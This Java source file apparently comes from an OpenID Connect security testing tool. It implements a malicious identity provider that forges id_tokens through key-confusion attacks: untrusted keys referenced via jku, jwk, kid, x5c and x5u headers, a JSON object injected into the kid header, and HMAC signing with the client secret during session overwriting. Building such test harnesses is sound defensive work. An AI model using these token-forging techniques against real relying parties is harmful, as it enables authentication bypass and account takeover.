package de.rub.nds.oidc.server.op;

import com.google.common.base.Strings;
import com.nimbusds.jose.*;
import com.nimbusds.jose.crypto.MACSigner;
import com.nimbusds.jose.crypto.RSASSASigner;
import com.nimbusds.jose.jwk.JWK;
import com.nimbusds.jose.jwk.JWKSet;
import com.nimbusds.jose.jwk.RSAKey;
import com.nimbusds.jose.util.Base64;
import com.nimbusds.jose.util.Base64URL;
import com.nimbusds.jwt.JWT;
import com.nimbusds.jwt.JWTClaimsSet;
import com.nimbusds.jwt.SignedJWT;
import com.nimbusds.oauth2.sdk.ParseException;
import com.nimbusds.oauth2.sdk.http.HTTPRequest;
import com.nimbusds.oauth2.sdk.http.ServletUtils;
import com.nimbusds.oauth2.sdk.id.ClientID;
import com.nimbusds.openid.connect.sdk.AuthenticationRequest;
import com.nimbusds.openid.connect.sdk.Nonce;
import com.nimbusds.openid.connect.sdk.claims.AccessTokenHash;
import com.nimbusds.openid.connect.sdk.claims.CodeHash;
import com.nimbusds.openid.connect.sdk.rp.OIDCClientInformation;
import de.rub.nds.oidc.server.RequestPath;

import javax.annotation.Nonnull;
import javax.annotation.Nullable;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.ws.rs.core.UriBuilder;
import java.io.IOException;
import java.net.URI;
import java.security.GeneralSecurityException;
import java.security.KeyStore;
import java.security.cert.CertificateEncodingException;
import java.util.ArrayList;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.TimeoutException;

import static de.rub.nds.oidc.server.op.OPParameterConstants.*;

// TODO: I think we dont need the INCLUDE_SIGNING_CERT param in the testplan at all?

// TODO: didscovery must announce all algorithms used for signing in any testcase (EC, RSA, HS)

// TODO: add kid in all testcases - kid sollte (fast) immer im header stehen, vor allem, wenn mehrere keys an der URL gehosted werden.

public class KeyConfusionOP extends DefaultOP {
    private int requestCount = 0;
    private URI untrustedKeyUri;
    private String untrustedKeyJsonResponse;
    private CompletableFuture<?> waitForHonest;

    @Override
    protected JWT getIdToken(@Nonnull ClientID clientId, @Nullable Nonce nonce, @Nullable AccessTokenHash atHash,
                             @Nullable CodeHash cHash) throws GeneralSecurityException, JOSEException, ParseException {

        untrustedKeyUri = UriBuilder.fromUri(baseUri).path(this.UNTRUSTED_KEY_PATH).build();

        SignedJWT signedJwt = null;
        JWTClaimsSet claims = getIdTokenClaims(clientId, nonce, atHash, cHash);

        if (params.getBool(FORCE_IDTOKEN_HEADER_UNTRUSTED_JKU)) {
            signedJwt = jkuKeyConfusion(claims);
        } else if (params.getBool(FORCE_IDTOKEN_HEADER_UNTRUSTED_JWK)) {
            signedJwt = jwkKeyConfusion(claims);
        } else if (params.getBool(FORCE_IDTOKEN_HEADER_UNTRUSTED_KID)) {
            signedJwt = kidKeyConfusion(claims);
        } else if (params.getBool(FORCE_IDTOKEN_HEADER_UNTRUSTED_X5C)) {
            signedJwt = x5cKeyConfusion(claims);
        } else if (params.getBool(FORCE_IDTOKEN_HEADER_UNTRUSTED_X5U)) {
            signedJwt = x5uKeyConfusion(claims);
        } else if ( params.getBool(FORCE_REGISTER_SAME_CLIENTID) ) {
            // keyConfusion 6 (KC w/ SessionOverwriting)
            signedJwt = hmacKeyConfusion(claims);
         }


        // store keyresponse in context
        //stepCtx.put(OPContextConstants.UNTRUSTED_KEY_RESPONSE, untrustedKeyJsonResponse);

        // TODO: add default case to make sure signedJwt is never null

        logger.log("generated id_token header:\n" + signedJwt.getHeader().toString()); // TODO: this fails on "malformed" headers like {kid:JSONObject}
        logger.log("generated id_token body:\n" + signedJwt.getPayload().toString());

        return signedJwt;
    }

    @Override
    public void authRequest(RequestPath path, HttpServletRequest req, HttpServletResponse resp) throws IOException {
        if (! params.getBool(FORCE_REGISTER_SAME_CLIENTID) ) {
            super.authRequest(path, req, resp);
            return;
        }
        // KC6 (KC w SessionOverwriting),
        try {
            if (type == OPType.HONEST) {
                // second authreq
                logger.log("Authentication requested at Honest OP.");
                HTTPRequest reqMsg = ServletUtils.createHTTPRequest(req);
                logger.logHttpRequest(req, reqMsg.getQuery());

                // TODO the future can be an instance variable
//                CompletableFuture<?> releaseHonest = (CompletableFuture<?>) stepCtx.get(OPContextConstants.BLOCK_OP_FUTURE);
                waitForHonest.complete(null);

            } else {
                // first authreq
                logger.log("Authentication requested at Evil OP.");
                HTTPRequest reqMsg = ServletUtils.createHTTPRequest(req);
                logger.logHttpRequest(req, reqMsg.getQuery());
//                AuthenticationRequest authReq = AuthenticationRequest.parse(reqMsg);

//                CompletableFuture<?> waitForHonestReq = (CompletableFuture<?>) stepCtx.get(OPContextConstants.BLOCK_OP_FUTURE);
				waitForHonest = new CompletableFuture<>();
                waitForHonest.get(30, TimeUnit.SECONDS);

				// send response using default op implementation
				logger.log("Releasing AuthResponse from Evil OP");
				super.authRequest(path, req, resp);
            }
        } catch (InterruptedException ex) {
            logger.log("Waiting for client to discover evil OP was interrupted.", ex);
        } catch (ExecutionException | TimeoutException ex) {
            logger.log("Waiting for client to discover evil failed.", ex);

        }
    }

    public void untrustedKeyRequest(RequestPath path, HttpServletRequest req, HttpServletResponse resp) throws IOException {
        // mark as SSRF vuln as requested URL was delivered to RP via id_token
        // (even through the frontchannel if implicit flow)
        // TODO: only FAIL here if (implict || hybrid) flow is used?
        stepCtx.put(OPContextConstants.UNTRUSTED_KEY_REQUESTED, true);

        logger.log("Untrusted key requested");
        logger.logHttpRequest(req, null);

//        String jsonString = (String) stepCtx.get(OPContextConstants.UNTRUSTED_KEY_RESPONSE);
//        untrustedKeyJsonResponse = Strings.isNullOrEmpty(jsonString) ? "{}" : jsonString;
        untrustedKeyJsonResponse = Strings.isNullOrEmpty(untrustedKeyJsonResponse) ? "{}" : untrustedKeyJsonResponse;

        resp.getWriter().write(untrustedKeyJsonResponse);
        resp.setContentType("application/json; charset=UTF-8");
        resp.flushBuffer();
        logger.logHttpResponse(resp, untrustedKeyJsonResponse);
    }


    // JKU KC
    private SignedJWT jkuKeyConfusion(JWTClaimsSet claims) throws JOSEException {

        KeyStore.PrivateKeyEntry untrustedEntry = opivCfg.getUntrustedSigningEntry();
        RSAKey key = getSigningJwk(untrustedEntry);

        JWSHeader.Builder hb = new JWSHeader.Builder(JWSAlgorithm.RS256)
                .type(JOSEObjectType.JWT);
        // jku field in id_token header points to untrustedKeyUri, where the untrusted key is served as jwks
        hb.jwkURL(untrustedKeyUri);

        if (requestCount == 0) {
            // prepare key to be served at untrustedKeyUri
            untrustedKeyJsonResponse = key.toPublicJWK().toString();
        } else if (requestCount == 1) {
            // the hosted jwks contains both the untrusted key and the trusted (as served on discovery endpoint)
            JWK trustedKey = getSigningJwk(opivCfg.getEvilOPSigningEntry()).toPublicJWK();

            ArrayList<JWK> list = new ArrayList<>();
            list.add(key.toPublicJWK());
            list.add(trustedKey);
            JWKSet jwkSet = new JWKSet(list);
            untrustedKeyJsonResponse = jwkSet.toString();
        } else if (requestCount == 2) {
            // the hosted jwks contains trusted key at first position and the untrusted key second
            JWK trustedKey = getSigningJwk(opivCfg.getEvilOPSigningEntry()).toPublicJWK();

            ArrayList<JWK> list = new ArrayList<>();
            list.add(trustedKey);
            list.add(key.toPublicJWK());
            JWKSet jwkSet = new JWKSet(list);
            untrustedKeyJsonResponse = jwkSet.toString();
            // signal Browser that all test runs have been finished
            stepCtx.put(OPContextConstants.MULTI_PART_TEST_FINISHED, true);
        }

        // increase request counter
        requestCount += 1;

        logger.log("Prepared untrusted key response:");
        logger.log(untrustedKeyJsonResponse);

        // prepare and sign id_token
        JWSHeader header = hb.build();
        SignedJWT signedJwt = new SignedJWT(header, claims);
        JWSSigner signer = new RSASSASigner(key);
        signedJwt.sign(signer);

        return signedJwt;
        // TODO: early exit, if untrustedKeyUri was not requested after first try.
    }

    // TODO: add test case for URL: untrustedKeyURi im JWK tag des headers angeben
    // TODO: add hmac jwk with "jwk":{"kty": "oct", "k": Base64(key)}
    // The JWK KC
    private SignedJWT jwkKeyConfusion(JWTClaimsSet claims) throws JOSEException {

        KeyStore.PrivateKeyEntry untrustedEntry = opivCfg.getUntrustedSigningEntry();
        RSAKey key = getSigningJwk(untrustedEntry);

        JWSHeader.Builder hb = new JWSHeader.Builder(JWSAlgorithm.RS256)
                .type(JOSEObjectType.JWT);
        hb.jwk(key.toPublicJWK());

        logger.log("No untrusted key response for this test");
//        logger.log(untrustedKeyJsonResponse.toString());

        JWSHeader header = hb.build();

        SignedJWT signedJwt = new SignedJWT(header, claims);
        JWSSigner signer = new RSASSASigner(key);
        signedJwt.sign(signer);

        // there is only one test case for jwk key confusion
        stepCtx.put(OPContextConstants.MULTI_PART_TEST_FINISHED, true);

        return signedJwt;
    }


    // The KID KC
    private SignedJWT kidKeyConfusion(JWTClaimsSet claims) throws JOSEException {
        JWSHeader header;

        KeyStore.PrivateKeyEntry untrustedEntry = opivCfg.getUntrustedSigningEntry();
        RSAKey key = getSigningJwk(untrustedEntry);

        if (requestCount == 0) {
            JWSHeader.Builder hb = new JWSHeader.Builder(JWSAlgorithm.RS256)
                    .type(JOSEObjectType.JWT);
            hb.keyID(untrustedKeyUri.toString());
            header = hb.build();
        } else { // if (requestCount == 1) {
//            JSONObject jsonKey = key.toPublicJWK().toJSONObject();
//            JsonObject jsonKey = Json.createObjectBuilder().add("kid", key.toJSONString()).build();
//            header = JWSHeader.parse(jsonKey.toString());
            JWSHeader.Builder hb = new JWSHeader.Builder(JWSAlgorithm.RS256).type(JOSEObjectType.JWT);
            //hb.keyID(key.toPublicJWK().toString());
            // TODO: ^this does not add a valid json object as kid
            // instead the key is auto converted to a string -
//            hb.customParam("kid", key.toPublicJWK());
            hb.parsedBase64URL(Base64URL.encode("{\"alg\":\"RS256\",\"typ\":\"JWT\",\"kid\":" + key.toPublicJWK().toString() + "}")); // this seems to work, but logging the header fails apparently ??
            header = hb.build();

            // this was the last test step for kid key confusion
            stepCtx.put(OPContextConstants.MULTI_PART_TEST_FINISHED, true);
        }

        SignedJWT signedJwt = new SignedJWT(header, claims);
        JWSSigner signer = new RSASSASigner(key);
        signedJwt.sign(signer);

        untrustedKeyJsonResponse = key.toPublicJWK().toString();
        logger.log("Prepared untrusted key response:");
        logger.log(untrustedKeyJsonResponse.toString());

        requestCount++;
        return signedJwt;
    }


    // The X5C KC
    private SignedJWT x5cKeyConfusion(JWTClaimsSet claims) throws JOSEException, CertificateEncodingException {
        JWSHeader.Builder hb = new JWSHeader.Builder(JWSAlgorithm.RS256).type(JOSEObjectType.JWT);
        ArrayList<Base64> list = new ArrayList<>();
        KeyStore.PrivateKeyEntry untrustedEntry = opivCfg.getUntrustedSigningEntry();
        RSAKey key = getSigningJwk(untrustedEntry);

        Base64 untrustedCert = Base64.encode(untrustedEntry.getCertificate().getEncoded());

        if (requestCount == 0) {
            // untrusted cert only
            list.add(untrustedCert);
        } else if (requestCount == 1) {
            // trusted first, untrusted second
            Base64 trustedCert = Base64.encode(opivCfg.getEvilOPSigningEntry().getCertificate().getEncoded());
            list.add(trustedCert);
            list.add(untrustedCert);
        } else if (requestCount == 2) {
            // untrusted cert first, trusted second
            Base64 trustedCert = Base64.encode(opivCfg.getEvilOPSigningEntry().getCertificate().getEncoded());

            list.add(untrustedCert);
            list.add(trustedCert);

            // this is the last test case for x5c key confusion
            stepCtx.put(OPContextConstants.MULTI_PART_TEST_FINISHED, true);
        }

        hb.x509CertChain(list);
        JWSHeader header = hb.build();

        SignedJWT signedJwt = new SignedJWT(header, claims);
        JWSSigner signer = new RSASSASigner(key);
        signedJwt.sign(signer);

        requestCount++;
        return signedJwt;
    }


    // TODO: check x5uURL vs jwkURL
    // The X5U KC
    private SignedJWT x5uKeyConfusion(JWTClaimsSet claims) throws JOSEException {
        KeyStore.PrivateKeyEntry untrustedEntry = opivCfg.getUntrustedSigningEntry();
        RSAKey key = getSigningJwk(untrustedEntry);

        JWSHeader.Builder hb = new JWSHeader.Builder(JWSAlgorithm.RS256)
                .type(JOSEObjectType.JWT);
        hb.x509CertURL(untrustedKeyUri);
        JWSHeader header = hb.build();

        SignedJWT signedJwt = new SignedJWT(header, claims);
        JWSSigner signer = new RSASSASigner(key);
        signedJwt.sign(signer);

        untrustedKeyJsonResponse = key.toPublicJWK().toString();
        logger.log("Prepared untrusted key response:");
        logger.log(untrustedKeyJsonResponse);

        // there is only one test case for x5u key confusion
        stepCtx.put(OPContextConstants.MULTI_PART_TEST_FINISHED, true);

        return signedJwt;
    }

    // TODO: KeyConfusion 6: adjust SessionOverwritingOP or add logic here

//
//    public JWSObject decodeJOSEString(String encodedJOSE) throws java.text.ParseException {
//        String[] splittedString = encodedJOSE.split("\\.");
//        JWSObject jwsObject = new SignedJWT(new Base64URL(splittedString[0]), new Base64URL(splittedString[1]), new Base64URL(splittedString[2]));
//        return jwsObject;
//    }

    private SignedJWT hmacKeyConfusion(JWTClaimsSet claims) throws GeneralSecurityException {
        // replace client ID (use same ID for evil and honest
        OIDCClientInformation cinfo = (OIDCClientInformation) stepCtx.get(OPContextConstants.REGISTERED_CLIENT_INFO_EVIL);
//        ClientID cid = cinfo.getID();
        //claims. //= super.getIdTokenClaims(cid, nonce, atHash, cHash);

//        JWTClaimsSet newClaims = super.getIdTokenClaims(cid, claims.getClaim("nonce"), claims.getClaim("atHash"), claims.getClaim("cHash"));


        JWSHeader.Builder hb = new JWSHeader.Builder(JWSAlgorithm.HS256).type(JOSEObjectType.JWT);
        JWSHeader header = hb.build();
        SignedJWT signedJwt = new SignedJWT(header, claims);
        try {
            JWSSigner signer = new MACSigner(cinfo.getSecret().getValueBytes());
            signedJwt.sign(signer);
//            stepCtx.put(OPContextConstants.MULTI_PART_TEST_FINISHED, true);
            return signedJwt;
        } catch (JOSEException e) {
            throw new GeneralSecurityException(e);
        }
    }

}
